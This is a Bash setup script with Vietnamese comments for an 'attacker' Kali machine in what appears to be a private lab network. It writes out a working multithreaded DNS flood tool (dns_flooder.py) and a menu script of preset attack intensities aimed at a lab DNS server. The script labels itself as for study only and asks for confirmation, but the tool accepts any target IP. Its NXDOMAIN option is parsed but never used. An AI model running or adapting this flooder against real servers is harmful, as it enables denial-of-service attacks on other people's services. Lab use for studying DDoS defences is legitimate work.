#!/bin/bash

# Setup script cho máy Kali Linux (Attacker)
# IP: 192.168.85.100

echo "=== DNS DDoS Attack Tools Setup - Kali Linux ==="

# Kiểm tra quyền root
if [[ $EUID -eq 0 ]]; then
   echo "Không nên chạy script này với quyền root" 
   exit 1
fi

# Cập nhật hệ thống
echo "Cập nhật hệ thống..."
sudo apt update && sudo apt upgrade -y

# Cài đặt dependencies
echo "Cài đặt Python và tools..."
sudo apt install -y python3 python3-pip git dnsutils hping3 nmap

# Cài đặt Python packages
echo "Cài đặt Python packages..."
pip3 install --user scapy dnspython requests colorama

# Tạo thư mục attack tools
echo "Tạo thư mục attack tools..."
mkdir -p ~/dns_attacks
cd ~/dns_attacks

# Copy attack tools (giả sử đã có sẵn)
# Nếu chưa có, tạo file dns_flooder.py
cat > dns_flooder.py << 'EOF'
#!/usr/bin/env python3
"""
DNS Flooder - Công cụ mô phỏng tấn công DNS Flood
CHỈ SỬ DỤNG CHO MỤC ĐÍCH HỌC TẬP VÀ NGHIÊN CỨU
"""

import socket
import random
import time
import threading
import argparse
from struct import pack
import sys

class DNSFlooder:
    def __init__(self, target_ip, target_port=53, threads=10, rate=100):
        self.target_ip = target_ip
        self.target_port = target_port
        self.threads = threads
        self.rate = rate
        self.running = False
        
        # Domains for testing
        self.test_domains = [
            'test.local',
            'www.test.local', 
            'mail.test.local',
            'ftp.test.local',
            'web.test.local',
            'api.test.local',
            'blog.test.local',
            'shop.test.local'
        ]
        
        # Random domains for NXDOMAIN
        self.random_domains = []
        for i in range(100):
            length = random.randint(5, 15)
            domain = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=length))
            self.random_domains.append(f"{domain}.test.local")

    def create_dns_query(self, domain, query_type='A'):
        """Tạo DNS query packet"""
        transaction_id = pack('!H', random.randint(1, 65535))
        flags = pack('!H', 0x0100)
        qdcount = pack('!H', 1)
        ancount = pack('!H', 0)
        nscount = pack('!H', 0)
        arcount = pack('!H', 0)
        
        qname = b''
        for part in domain.split('.'):
            qname += pack('!B', len(part)) + part.encode()
        qname += b'\x00'
        
        if query_type == 'A':
            qtype = pack('!H', 1)
        elif query_type == 'ANY':
            qtype = pack('!H', 255)
        elif query_type == 'MX':
            qtype = pack('!H', 15)
        elif query_type == 'TXT':
            qtype = pack('!H', 16)
        else:
            qtype = pack('!H', 1)
            
        qclass = pack('!H', 1)
        
        return transaction_id + flags + qdcount + ancount + nscount + arcount + qname + qtype + qclass

    def flood_worker(self, worker_id):
        """Worker thread để gửi DNS queries"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        queries_sent = 0
        
        print(f"Worker {worker_id} started targeting {self.target_ip}")
        
        while self.running:
            try:
                domain = random.choice(self.test_domains + self.random_domains)
                query_type = random.choice(['A', 'MX', 'ANY', 'TXT'])
                query = self.create_dns_query(domain, query_type)
                
                sock.sendto(query, (self.target_ip, self.target_port))
                queries_sent += 1
                
                time.sleep(1.0 / (self.rate / self.threads))
                
                if queries_sent % 100 == 0:
                    print(f"Worker {worker_id}: {queries_sent} queries sent")
                    
            except Exception as e:
                print(f"Worker {worker_id} error: {e}")
                time.sleep(1)
        
        sock.close()
        print(f"Worker {worker_id} stopped. Total: {queries_sent} queries")

    def start_flood(self, duration=60):
        """Bắt đầu tấn công flood"""
        print(f"Starting DNS flood attack on {self.target_ip}:{self.target_port}")
        print(f"Threads: {self.threads}, Rate: {self.rate} qps, Duration: {duration}s")
        
        self.running = True
        workers = []
        
        for i in range(self.threads):
            worker = threading.Thread(target=self.flood_worker, args=(i,))
            workers.append(worker)
            worker.start()
        
        try:
            time.sleep(duration)
        except KeyboardInterrupt:
            print("\nStopping attack...")
        
        self.running = False
        
        for worker in workers:
            worker.join()
        
        print("DNS flood attack completed")

def main():
    parser = argparse.ArgumentParser(description='DNS Attack Simulator')
    parser.add_argument('target', help='Target DNS server IP')
    parser.add_argument('--port', type=int, default=53, help='Target port')
    parser.add_argument('--type', choices=['flood', 'nxdomain', 'both'], default='flood')
    parser.add_argument('--threads', type=int, default=10, help='Number of threads')
    parser.add_argument('--rate', type=int, default=100, help='Queries per second')
    parser.add_argument('--duration', type=int, default=60, help='Duration in seconds')
    
    args = parser.parse_args()
    
    print("="*60)
    print("DNS Attack Simulator - CHỈ DÙNG CHO HỌC TẬP")
    print("="*60)
    print(f"Target: {args.target}:{args.port}")
    print(f"Attack type: {args.type}")
    print(f"Duration: {args.duration} seconds")
    print("="*60)
    
    confirm = input("Bạn có chắc chắn muốn bắt đầu? (yes/no): ")
    if confirm.lower() != 'yes':
        print("Attack cancelled.")
        return
    
    flooder = DNSFlooder(args.target, args.port, args.threads, args.rate)
    flooder.start_flood(args.duration)

if __name__ == '__main__':
    main()
EOF

chmod +x dns_flooder.py

# Tạo script test connectivity
cat > test_dns.sh << 'EOF'
#!/bin/bash

DNS_SERVER="192.168.85.130"
WEB_SERVER="192.168.85.135"

echo "=== Testing DNS Connectivity ==="

# Test basic DNS resolution
echo "Testing basic DNS resolution..."
dig @$DNS_SERVER test.local +short

# Test different record types
echo "Testing A record..."
dig @$DNS_SERVER www.test.local A +short

echo "Testing MX record..."
dig @$DNS_SERVER test.local MX +short

echo "Testing TXT record..."
dig @$DNS_SERVER test.local TXT +short

# Test web connectivity
echo "Testing web server connectivity..."
curl -I http://$WEB_SERVER/ 2>/dev/null | head -1

echo "=== Connectivity test completed ==="
EOF

chmod +x test_dns.sh

# Tạo script attack scenarios
cat > attack_scenarios.sh << 'EOF'
#!/bin/bash

DNS_TARGET="192.168.85.130"

echo "=== DNS Attack Scenarios ==="
echo "1. Light attack (testing)"
echo "2. Medium attack" 
echo "3. Heavy attack"
echo "4. NXDOMAIN attack"
echo "5. Mixed attack"
echo "6. Custom attack"

read -p "Choose scenario (1-6): " choice

case $choice in
    1)
        echo "Starting light attack..."
        python3 dns_flooder.py $DNS_TARGET --threads 5 --rate 50 --duration 30
        ;;
    2)
        echo "Starting medium attack..."
        python3 dns_flooder.py $DNS_TARGET --threads 10 --rate 100 --duration 60
        ;;
    3)
        echo "Starting heavy attack..."
        python3 dns_flooder.py $DNS_TARGET --threads 20 --rate 200 --duration 120
        ;;
    4)
        echo "Starting NXDOMAIN attack..."
        python3 dns_flooder.py $DNS_TARGET --type nxdomain --threads 8 --rate 80 --duration 60
        ;;
    5)
        echo "Starting mixed attack..."
        python3 dns_flooder.py $DNS_TARGET --type both --threads 15 --rate 150 --duration 90
        ;;
    6)
        read -p "Threads: " threads
        read -p "Rate (qps): " rate  
        read -p "Duration (s): " duration
        python3 dns_flooder.py $DNS_TARGET --threads $threads --rate $rate --duration $duration
        ;;
    *)
        echo "Invalid choice"
        ;;
esac
EOF

chmod +x attack_scenarios.sh

echo ""
echo "=== Setup completed! ==="
echo ""
echo "Available tools:"
echo "- dns_flooder.py: Main attack tool"
echo "- test_dns.sh: Test DNS connectivity"
echo "- attack_scenarios.sh: Pre-configured attack scenarios"
echo ""
echo "Usage examples:"
echo "1. Test connectivity: ./test_dns.sh"
echo "2. Run scenarios: ./attack_scenarios.sh"
echo "3. Manual attack: python3 dns_flooder.py 192.168.85.130 --threads 10 --rate 100 --duration 60"
echo ""
echo "Target DNS Server: 192.168.85.130"
echo "Target Web Server: 192.168.85.135"